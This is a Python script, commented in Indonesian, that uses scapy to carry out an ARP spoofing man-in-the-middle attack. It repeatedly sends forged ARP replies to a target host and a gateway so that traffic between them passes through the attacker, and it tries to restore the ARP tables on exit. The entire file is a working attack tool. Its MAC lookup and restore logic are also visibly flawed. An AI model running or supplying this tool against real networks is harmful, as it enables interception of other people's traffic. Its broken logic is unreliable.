import scapy.all as scapy
import argparse as args
import time

def get_args(): # funct untuk menangkap argument yang di input
    parser = args.ArgumentParser()
    parser.add_argument(
        "-t",
        "--target",
        dest="target",
        help="Target IP Address and MAC Address"
    )
    parser.add_argument(
        "-s",
        "--source",
        dest="source",
        help="Target IP Address and MAC Address"
    )

    options = parser.parse_args()

    if not options.target and not options.source: # pengecekan apakah target dan source kosong atau tidak
        parser.error(
            "[-] Please specify an target and source, use --help or -h for more info.")
    elif not options.target: # pengecekan apakah target kosong atau tidak
        parser.error("[-] Please specify an Target")
    elif not options.source: # pengecekan apakah source kosong atau tidak
        parser.error("[-] Please specify an Source")
    
    return options
# end def

# start def
def get_mac(ip): # funct untuk mencari mac address dari IP target
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") 
    arp_request_broadcast = broadcast/arp_request 
    answered_list = scapy.srp(arp_request_broadcast, timeout=2, verbose=False)[0]
    
    if answered_list =="": # pengecekan apakah answered kosong atau tidak
        return answered_list[0][1].hwsrc
# end def

# start def
def spoof(ip_target, ip_spoof): # funct untuk melakukan spoof antara komputer korban dan access point
    target_mac = get_mac(ip_target)
    packet = scapy.ARP(op=2, pdst=ip_target, hwdst=target_mac, psrc=ip_spoof) # membuat var packet untuk menampung packet/data yang akan dijalankan
    
    scapy.send(packet, verbose=False)  # mengirim packet
    
    return
# end def

# start def
def restore(dest_ip, src_ip): # funct untuk mengembalikan keadaan komputer korban dan access point ketika kita nanti keluar dari serangan yang dilakukan
    dest_mac = get_mac(dest_ip) # MAC Address tujuan/korban
    src_mac = get_mac(src_ip) # MAC Address komputer penyerang
    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=src_ip, hwsrc=src_mac)
    
    scapy.send(packet, count=4, verbose=False)
    
    return
# end def

# start def
def main():
    opt = get_args()
    send_packet = 0
    try:
        while True:
            spoof(opt.target, opt.source)
            spoof(opt.source, opt.target)
            send_packet+=2
            print("\r[+] Packets Send:",send_packet, end=" ")
            time.sleep(2)
            
    except KeyboardInterrupt:
        print("[-] Detected CTRL + C ...... Resetting ARP Table ....")
        restore(opt.target, opt.source) # panggil function restore
        
    return
if __name__=='__main__':
    main()
# end def
